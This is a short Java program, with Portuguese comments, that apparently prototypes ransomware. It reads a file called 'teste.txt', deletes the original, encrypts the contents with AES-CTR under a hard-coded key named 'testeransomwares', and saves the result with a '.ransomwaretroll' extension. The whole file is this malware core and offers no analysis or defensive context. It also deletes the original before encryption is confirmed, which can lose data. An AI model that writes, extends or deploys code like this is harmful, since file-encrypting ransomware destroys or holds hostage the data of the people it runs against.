import javax.crypto.*;
import javax.crypto.spec.*;
import java.io.*;
import java.security.*;

public class CryptoFile {
    public static void main(String[] args) throws Exception {
        // Nome do arquivo a ser criptografado
        String fileName = "teste.txt";
        
        // Abrir o arquivo a ser criptografado
        FileInputStream file = new FileInputStream(fileName);
        byte[] fileData = new byte[(int) new File(fileName).length()];
        file.read(fileData);
        file.close();

        // Remover o arquivo original
        File originalFile = new File(fileName);
        originalFile.delete();

        // Chave de criptografia (deve ter 16 bytes para AES-128)
        byte[] key = "testeransomwares".getBytes();

        // Configuração para o modo de operação CTR
        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
        
        // Gerar um vetor de inicialização (IV) aleatório de 16 bytes
        byte[] iv = new byte[16];
        SecureRandom secureRandom = new SecureRandom();
        secureRandom.nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        // Inicializar o Cipher para criptografar com a chave e IV
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
        
        // Criptografar os dados do arquivo
        byte[] cryptoData = cipher.doFinal(fileData);

        // Criar um novo nome para o arquivo criptografado
        String newFileName = fileName + ".ransomwaretroll";
        
        // Salvar o arquivo criptografado
        FileOutputStream newFile = new FileOutputStream(newFileName);
        newFile.write(iv);  // Escrever o IV no começo do arquivo criptografado (para que possa ser usado na descriptografia)
        newFile.write(cryptoData);
        newFile.close();
        
        System.out.println("Arquivo criptografado com sucesso!");
    }
}
